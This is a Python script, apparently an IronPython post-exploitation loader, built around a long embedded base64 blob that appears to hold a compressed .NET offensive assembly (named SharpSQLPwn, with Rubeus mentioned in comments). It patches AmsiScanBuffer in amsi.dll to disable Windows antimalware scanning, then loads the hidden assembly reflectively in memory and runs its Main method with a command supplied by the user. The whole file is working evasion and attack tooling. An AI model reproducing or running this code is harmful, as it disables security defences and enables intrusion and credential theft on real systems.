sU2Mwd47VchjQaS58o5Q1OpdeTrsb7N6utraEV6U97UFN/fO+JDpzb33Mt7D23vaRE6QspDn7f62qG97z3Z/mEmyDzCFYZ8VaLN6t2GWrw8Qfx/mhf/4kbN3XZP8xlt9oR5fKOwL+Zj4tjNWUdRhCHCBh8DHIu0QFB0QBj+2NNvjawMfRVC+XPS9WQRmldvAj7cwq2TxWp1gCU63s3jvNpEKWxAmjbjBAgumfVvutnPVk5Vy9mK+UK0XK+XpBbtyoWYhnI/gNlrQObWQs6tTdx4/faEMSIFldyOeUuGB3PKDhWWArRb0ZirVZbs4v1CPvvCxaDQ+GI8D7LXg5nwyGS/khnIH07lc7GByLp0/mM6n5w4Op4YGc4n48OBIOg/QYUEwNhAfiAEcs+DagZPZ6Qk7t1i4ULEfOnBXwa4ha7c+nBwYRKZ7NjlF48VatZRbPonJjaxO1CmJJhmbX8tZ32Z31pZJ/N3yMv6eB+Nvo5mEM1PjU+2df/rP71rO3v4b0W/Bsxc2FVibxw+fzZ2Nna2d1cRxtjL74NkzhVIhVyvo+QPVuVn4xMsK6RdYPAqef8+9rKfOZSp29mLhRK5Yhv/T3vW0OA1E8bFbBBcXxJN4Gga9CE27tYdS2u0uLAuFld3D2quMybQbdjKJmSTYmx/Bg1/Cm3cRL34ADx49CN687DdQ35v87baRCl6EfYVMMzPv9968TPJe5g/xtO2HQliOlHnxr4eE7q/HuaYaaphrTAl5dQ/SU0iXy/FWIKS/Jh/pSmZR/7ym/id4Br7+RkhvqyzpbWF3nMIT/BkccVVgubFgYtYln5h6H5qXPxGnYbDKdJzhNAspJR2avKnxdUfgFTDWnpjVOb4pf2C4zowXwlVEshInp/Su+aaBGLgLIMwi/FWkwNQpt0z0ICLpQP59Y4882shHWVLqkltFWUDSVTl5JIq0MpUNtE9uA08u/9B4tfJz7qXeNZPr8C5ys8K/PMmOhFPs3XSKHWTdgbqln07HTksN/zz6RCBeuAv8x/B/bjixpQG0I8yilQjqrOZR8jaLDtON04Q8MjYscdKr5Zi4D+VfFBZFmajzSYbnZjrn7VUb6943dk53e+A7GkYo1WtTZ9+Ose8y31UrV23cB49zY80HuOt5LNOvvnwn5Eels1++/zgcv/QkTTJ3wHatDqNC2b7jqvmIPT07avUZ1RFXDpe+EiO2EJqN93a2d7aHXGvhPZcLChBKj1gcqoG2z4XHdctz7dDX/ixq2b434Nqzkl1GPa7cmdDRtCoPwCgtwCaOUJEbLZZ0wh+jChzRiD1ZHASBdG2OvtXiQcDaKUIUxjqaqJm/oT7dVDJwamHHIcjMziEnFC9i0FM4p6GbuFLMhd4Q9TErUKo44H/sGDU+FomQVOJxxLieqMS/ECGjsXtg20KDgBmXWmSNMiDtNdrkqreXdB+2CyPA+bCdG3Vv5YH79/SZQO8m5OvgH2Bd039HvwFxHSfw"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpSQLPwn.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()